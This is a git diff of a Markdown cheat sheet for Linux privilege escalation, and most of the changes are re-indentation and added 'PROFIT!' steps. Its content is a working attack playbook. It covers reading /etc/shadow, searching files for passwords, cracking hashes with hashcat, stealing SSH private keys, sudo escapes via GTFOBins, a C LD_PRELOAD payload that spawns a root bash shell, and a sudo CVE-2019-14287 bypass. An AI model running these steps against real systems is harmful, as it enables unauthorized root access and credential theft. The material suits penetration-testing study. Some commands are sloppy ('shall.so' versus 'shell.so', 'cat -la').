@@ -1,61 +1,65 @@
 # Linux Privilege Escalation Cheat Sheet
 ## Initial Enumeration
 ### System Enumeration
-```bash
-hostname
-uname -a
-cat /proc/version
-cat /etc/issue
-lscpu
-```
+  ```bash
+  hostname
+  uname -a
+  cat /proc/version
+  cat /etc/issue
+  lscpu
+  ```
+
 ### Process Enumeration
-```bash
-ps aux
-ps aux | grep root
+  ```bash
+  ps aux
+  ps aux | grep root
 ```
+
 ### User Enumeration
-```bash
-whoami
-id
-sudo -l
-cat /etc/passwd
-cat /etc/passwd | cut -d : -f 1
-cat /etc/shadow
-cat /etc/group
-```
-```bash
-history
-```
+  ```bash
+  whoami
+  id
+  sudo -l
+  cat /etc/passwd
+  cat /etc/passwd | cut -d : -f 1
+  cat /etc/shadow
+  cat /etc/group
+  ```
+  ```bash
+  history
+  ```
+
 ### Network Enumeration
-```bash
-ifconfig
-ip a
-ip route
-arp -a
-ip neigh
-```
-```bash
-netstat -ano
-```
+  ```bash
+  ifconfig
+  ip a
+  ip route
+  arp -a
+  ip neigh
+  ```
+  ```bash
+  netstat -ano
+  ```
 
 ## Kernel Exploit
 ### Kernel Exploit Enumeration
 #### Check System Information
+  ```bash
+  hostname
+  uname -a
+  cat /etc/lsb-release
+  cat /proc/version
+  cat /etc/os-release
+  cat /etc/issue
+  lscpu
+  ```
 
-```bash
-hostname
-uname -a
-cat /etc/lsb-release
-cat /proc/version
-cat /etc/os-release
-cat /etc/issue
-lscpu
-```
 #### Check Running Process Information
-```bash
-ps aux
-ps aux | grep root
-```
+  ```bash
+  ps aux
+  ps aux | grep root
+  ```
+
 ### Kernel Exploitation Process
   1. Google for Exploits against the OS and Kernel Version 
   2. Download, compile, and run it against the target if it exists
@@ -63,80 +67,84 @@ ps aux | grep root
 
 ## Escalation via Password & File Permissions
 ### Stored Password
-A password may be stored in the bash history
-```bash
-history
-```
-Or in the files 
-```bash
-grep --color=auto -rnw '/' -ie "PASSW" --color=always 2> /dev/null
-find . -type f -exec grep -i -I "PASSW" {} /dev/null \;
-```
+  A password may be stored in the bash history
+  ```bash
+  history
+  ```
+  Or in the files 
+  ```bash
+  grep --color=auto -rnw '/' -ie "PASSW" --color=always 2> /dev/null
+  find . -type f -exec grep -i -I "PASSW" {} /dev/null \;
+  ```
+
 ### Weak File Permissions
-Verify File Permissions
-```bash
-ls -la /etc/passwd
-ls -la /etc/shadow
-```
-Copy the content of these files
-```bash
-cat -la /etc/passwd
-cat -la /etc/shadow
-```
-```bash
-unshadow <passwd_File> <shadow_file>
-```
-Identify the hash
-```web
-https://hashcat.net/wiki/doku.php?id=example_hashes
-```
-Crack the Hash with hashcat
-```powershell
-.\hashcat64.exe -m <hash_typw> <unshadowed_file> .\rockyou.txt -O
-```
+  1. Verify File Permissions
+  ```bash
+  ls -la /etc/passwd
+  ls -la /etc/shadow
+  ```
+  2. Copy the content of these files
+  ```bash
+  cat -la /etc/passwd
+  cat -la /etc/shadow
+  ```
+  ```bash
+  unshadow <passwd_File> <shadow_file>
+  ```
+  3. Identify the hash
+  ```web
+  https://hashcat.net/wiki/doku.php?id=example_hashes
+  ```
+  4. Crack the Hash with hashcat
+  ```powershell
+  .\hashcat64.exe -m <hash_typw> <unshadowed_file> .\rockyou.txt -O
+  ```
+  5. PROFIT!
 
 ### SSH Keys
-Find SSH Keys
-```bash
-find / -name authorized_keys 2> /dev/null
-find / -name id_rsa 2> /dev/null
-```
-Download the SSH key
-Change the permissions on the key 
-```bash
-chmod 600 id_rsa
-```
-Attempt the key
-```bash
-ssh -i id_rsa <user>@<ip>
-```
+  1.FInd SSH Keys
+  ```bash
+  find / -name authorized_keys 2> /dev/null
+  find / -name id_rsa 2> /dev/null
+  ```
+  2. Download the SSH key
+  3. Change the permissions on the key 
+  ```bash
+  chmod 600 id_rsa
+  ```
+  4. Attempt the key
+  ```bash
+  ssh -i id_rsa <user>@<ip>
+  ```
+  5. PROFIT!
 
 ## Escalation via Sudo
 ### Sudo Shell Escaping
-1. Look for root NOPASSWORD
-```bash
-sudo -l
-```
-2. Check GTFOBins for the binary with sudo
-```url
-https://gtfobins.github.io/
-```
-3. Run the command found.
-
-### Intended Functionality
-1. check what you can run as root
-  ```bash 
-  sudo -l
-  ```
-2. Research GTFOBins for the binary
-3. If nothing is found search for <binary> root privilege escalation
-  
-### LD_PRELOAD
-1. Identify LD_Preload with:
+  1. Look for root NOPASSWORD
   ```bash
   sudo -l
   ```
-2. Generate the following file: Shell.c
+  2. Check GTFOBins for the binary with sudo
+  ```url
+  https://gtfobins.github.io/
+  ```
+  3. Run the command found.
+  4. PROFIT!
+
+### Intended Functionality
+  1. check what you can run as root
+  ```bash
+  sudo -l
+  ```
+  3. Research GTFOBins for the binary
+  4. If nothing is found search for <binary> root privilege escalation
+  
+### LD_PRELOAD
+  1. Identify LD_Preload with
+  ```bash
+  sudo -l
+  ```
+  2. Generate the following file: Shell.c
   ```C
   #include <stdio.h>
   #include <sys/types.h>
@@ -149,16 +157,15 @@ https://gtfobins.github.io/
     system("/bin/bash");
   }  
   ```
-3. Compile the file:
-```bash
-gcc -fPIC -shared -o shall.so shell.c -nostartfiles
-```
-  
-4. Execute the attack
-```bash
-sudo LD_PRELOAD=<Path/to/>shell.so <binary we can run as sudo>
-```
-5. ROOT!
+  3. Compile the file:
+  ```bash
+  gcc -fPIC -shared -o shall.so shell.c -nostartfiles
+  ```
+  4. Execute the attack
+  ```bash
+  sudo LD_PRELOAD=<Path/to/>shell.so <binary we can run as sudo>
+  ```
+  5. ROOT!
 
 ### CVE-2019-14287
   1. Run sudo -l
@@ -172,6 +179,7 @@ sudo LD_PRELOAD=<Path/to/>shell.so <binary we can run as sudo>
   ```
   4 ROOT!
   
+###
 ## Escalation via SUID
 ## Escalation via Scheduled Tasks
 ### Check writeable Files and Directories
